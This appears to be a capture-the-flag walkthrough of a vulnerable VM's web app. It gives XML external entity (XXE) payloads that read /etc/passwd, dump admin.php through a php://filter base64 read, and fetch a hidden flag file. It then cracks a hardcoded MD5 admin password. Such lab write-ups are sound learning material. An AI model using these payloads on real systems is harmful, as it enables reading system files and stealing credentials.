@@ -1,0 +1,47 @@
+1: access the VM ip on port 80.
+--------------------------------------------------
+2: by checking (robots.txt) we can see there is a (xxe) folder and admin.php be sure the admin.php not in the web root and try it in the xxe folder.
+--------------------------------------------------
+3: IP/xxe will show a login page that has been vulnerable to Xml Xternal Entity(XXE).
+--------------------------------------------------
+4: submit the form and intercept it will show an xml post.
+--------------------------------------------------
+5: edit xml tags to test xxe
+<?xml version="1.0" ?>
+<!DOCTYPE r [
+<!ELEMENT r ANY >
+<!ENTITY sp SYSTEM "file:///etc/passwd">
+]>
+<root><name>&sp;</name><password>hj</password></root>
+(it will show (/etc/passwd)
+--------------------------------------------------
+6: change file:///etc/passwd to read admin.php content
+<?xml version="1.0" ?>
+<!DOCTYPE r [
+<!ELEMENT r ANY >
+<!ENTITY sp SYSTEM "php://filter/read=convert.base64-encode/resource=admin.php">
+]>
+<root><name>&sp;</name><password>hj</password></root>
+--------------------------------------------------
+7: we now got the content encoded to base64 after decode it we got this line
+               if ($_POST['username'] == 'administhebest' && 
+                  md5($_POST['password']) == 'e6e061838856bf47e1de730719fb2609') {
+user name and password decrypt the pass using google will show (admin@123).
+--------------------------------------------------
+8: administhebest:admin@123 we login as admin it will let you access the admin.php and show us flag with hyperLink to flagmeout.php -> in the same folder but the code send us to web root lets test /xxe/flagmeout.php it will open and by source view can see a comment says ( <!-- the flag in (JQZFMMCZPE4HKWTNPBUFU6JVO5QUQQJ5) --> )
+--------------------------------------------------
+9: decode JQZFMMCZPE4HKWTNPBUFU6JVO5QUQQJ5 using Base32 (http://www.simplycalc.com/base32-decode.php) we get a Base64 we decoded it ( /etc/.flag.php )
+--------------------------------------------------
+10: access the file (/etc/.flag.php)
+<?xml version="1.0" ?>
+<!DOCTYPE r [
+<!ELEMENT r ANY >
+<!ENTITY sp SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/.flag.php">
+]>
+<root><name>&sp;</name><password>hj</password></root>
+
+or simply without php://filter (<!ENTITY sp SYSTEM "/etc/.flag.php">) we got the code.
+--------------------------------------------------
+11: decode Base64 will show phpnonalpha2 code save it in your computer .e.g flag.php (make sure to add <?php and ?> to the code because it is php.
+--------------------------------------------------
+12: open terminal and type (php flag.php) will show error in the code but last line will show a flag says (SAFCSP{xxe_is_so_easy}).
